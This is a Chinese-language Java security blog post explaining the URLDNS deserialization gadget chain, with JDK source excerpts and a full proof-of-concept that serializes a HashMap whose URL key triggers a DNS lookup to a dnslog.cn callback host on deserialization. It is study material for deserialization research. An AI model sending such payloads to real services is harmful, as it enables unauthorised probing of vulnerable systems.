---
title: URLDNS链
author: Creexile
date: 2025-09-01
lastMod: 2025-09-01
summary: ''
cover: ''
category: 'Java安全'
draft: false
comments: false
sticky: 0
tags: [Java, 反序列化, 代码审计]
---

参考文章

1. [博客园-Java反序列化初探+URLDNS链](https://www.cnblogs.com/1vxyz/p/17231164.html)

# 前置知识

Gadget指的是一系列在目标应用的ClassPath中已存在的类的有机组合, 即调用链

# URLDNS

该链不存在版本限制, 一般用于验证反序列化漏洞是否存在; 思路是通过HashMap结合URL触发DNS检查

`HashMap`最早出现在JDK 1.2中, 底层基于散列算法实现; 因为在`HashMap`中`Entry`的存放位置是根据Key的Hash值来计算,然后存放到数组中的.

对于同一个Key, 在不同的JVM实现中计算得出的Hash值可能是不同的. 为了解决这个问题,`HashMap`实现了自己的`writeObject和readObject`方法, 正因如此造成了漏洞

## 调用链寻找思路

首先找到发起DNS请求的URL类`hashCode`方法, 发现HashMap重写了`hashCode`方法并在`readObject`方法中直接调用

_HashMap#readObject->hashCode->URL#hashCode->DNS请求_

```
HashMap.readObject()
  ->HashMap.hash()
    ->URL.hashCode()
      ->URLStreamHandler.hashCode()
        ->URLStreamHandler.getHostAddress()
```

## 代码审计

直接从`HashMap`开始吧; 查看一下`readObject`方法, 我们可以看到它重新计算了key的Hash

在`HashMap.java`中

```java
// Read the keys and values, and put the mappings in the HashMap
for (int i = 0; i < mappings; i++) {
    @SuppressWarnings("unchecked")
        K key = (K) s.readObject();
    @SuppressWarnings("unchecked")
        V value = (V) s.readObject();
    putVal(hash(key), key, value, false, false);
            }
```

跟进`hash`函数, 我们可以看到它调用了key的`hashcode`函数, 这里是漏洞触发点, 我们需要实现了`hashcode`函数且传参可控的类, 那就是URLDNS

```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

我们再来看看URLDNS这边的`hashcode`, 在`URL.java`中

```java
    /**
     * Creates an integer suitable for hash table indexing.<p>
     *
     * The hash code is based upon all the URL components relevant for URL
     * comparison. As such, this operation is a blocking operation.<p>
     *
     * @return  a hash code for this {@code URL}.
     */
    public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

发现当hashCode不是-1，则会调用URLStreamHandler抽象类的`hashCode()`函数, 跟进handler

找到URLStreamHandler这个抽象类, 查看它的`hashcode`, 发现调用了`getHostAddress`函数, 传参可控

```java
    /**
     * Provides the default hash calculation. May be overidden by handlers for
     * other protocols that have different requirements for hashCode
     * calculation.
     * @param u a URL object
     * @return an {@code int} suitable for hash table indexing
     * @since 1.3
     */
    protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u); // 看看
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }
    // ...
```

查看`getHostAddress`函数,可以发现它进行了DNS查询,将域名转换为实际的IP地址; 参数u是this 也就是URL对象

```java
    /**
     * Get the IP address of our host. An empty host field or a DNS failure
     * will result in a null return.
     *
     * @param u a URL object
     * @return an {@code InetAddress} representing the host
     * IP address.
     * @since 1.3
     */
    protected InetAddress getHostAddress(URL u) {
        return u.getHostAddress();
    }
```

URL类的`hashCode()`方法可以进行DNS查询，而Hashmap类 重写的`readObject`方法可以调用 `key.hashCode()`

我们可以通过Hashmap的`put`方法控制key为URL类, 构造hashmap对象序列化，这样反序列化的时候就可以实现DNS查询

```java
    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
// putVal方法是记录键值对的方法，过程是putVal()——newNode()——Node()

        Node(int hash, K key, V value, Node<K,V> next) {
            this.hash = hash;
            this.key = key;
            this.value = value;
            this.next = next;
        }

```

为什么 new出来了URL类实例url，还需要用反射机制呢？因为反射更灵活

> URL类里hashCode是private属性，无法直接设置，但是可以通过反射来设置

通过反射的方式，先将url对象的hashCode设置为1，这样在`hashmap.put(url,22)`的时候可以跳过DNS查询

> `hashmap`的key和 url对象指向的是同一对象，因此后面再通过反射将url对象的`hashCode`设置为-1时，`hashmap`里key(URL对象)的`hashCode`也会变成-1.

## 漏洞利用代码

```java
package urldns;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class Dnstest {
    public static void main(String[] args) throws Exception {
        HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
        URL url = new URL("http://w4qyn9.dnslog.cn");
        Class c = URL.class;
        Field fieldHashcode = c.getDeclaredField("hashCode");
        fieldHashcode.setAccessible(true);
        // 发现在生成过程中,dnslog就收到了请求,并且在反序列过程后dnslog不在收到新的请求,这显然不符合我们的期望
        // 原因是在put的过程中hashMap类就调用了hash方法,并且在hash方法中判断hashcode不为初始化的值(-1)时会直接
        // 返回,由于在序列化的时候已经进行了hashCode计算,那么在反序列化时hashCode值就不是-1了。就不会走到他真正的handler.hashCode方法里
        // 所以在hashmap.put()前 需要修改URL类hashCode值不为-1
        fieldHashcode.set(url,1);
        hashmap.put(url, 22);
        // 反序列化之后还是需要让他发送请求,所以需要改回来
        // 这是为了防止我们把put的时候发送的DNS请求误以为是反序列化时的readObject去发的DNS请求
        fieldHashcode.set(url,-1);
        Serializable(hashmap);
        //Unserializable(hashmap);
    }

    public static void Serializable(Object obj) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.ser"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
    }
}

```

反序列化代码:

```java
package urldns;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class test {
    public static void main(String[] args) throws ClassNotFoundException, IOException {
        // 反序列化的类
        ObjectInputStream ois = new ObjectInputStream((new FileInputStream("ser.ser")));
        // 读出来并反序列化
        ois.readObject();
        ois.close();
    }
}

```
